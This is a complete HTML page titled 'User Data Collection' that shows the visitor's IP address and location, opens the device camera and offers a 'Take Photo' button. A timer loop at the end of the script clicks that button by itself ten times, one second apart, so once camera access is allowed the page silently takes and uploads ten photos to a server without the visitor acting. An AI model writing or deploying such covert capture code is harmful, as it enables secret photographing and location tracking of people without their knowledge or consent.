<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>User Data Collection</title>
  </head>
  <body>
    <h1>Capture User Data</h1>
    <div id="user-info">
      <p>IP Address: <span id="ip"></span></p>
      <p>Location: <span id="location"></span></p>
    </div>
    <div id="camera">
      <video id="video" width="640" height="480" autoplay></video>
      <button id="snap">Take Photo</button>
      <canvas id="canvas" width="640" height="480" style="display: none"></canvas>
    </div>
    <script>
      // Get user IP and location
      fetch("/api/location")
        .then(response => response.json())
        .then(data => {
          if (data.ip) {
            document.getElementById("ip").textContent = data.ip;
          }
          if (data.city && data.region && data.country) {
            document.getElementById("location").textContent = `${data.city}, ${data.region}, ${data.country}`;
          } else {
            document.getElementById("location").textContent = "Location data not available.";
          }
        })
        .catch(error => console.error("Error:", error));

      // Access the device camera and take a photo
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const snap = document.getElementById("snap");

      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
          })
          .catch(error => console.error("Error accessing camera:", error));
      } else {
        console.error("getUserMedia not supported on your browser!");
      }

      snap.addEventListener("click", () => {
        const context = canvas.getContext("2d");
        context.drawImage(video, 0, 0, 640, 480);
        canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append("selfie", blob, "selfie.png");
          fetch("/api/upload", {
            method: "POST",
            body: formData,
          })
            .then(response => response.json())
            .then(data => {
              console.log("File uploaded successfully:", data.filePath);
            })
            .catch(error => console.error("Error uploading file:", error));
        });
      });

      let limit = 10;
      let interval = setInterval(() => {
        if (limit > 0) {
          snap.click();
          limit--;
        } else {
          clearInterval(interval);
        }
      }, 1000);
    </script>
  </body>
</html>
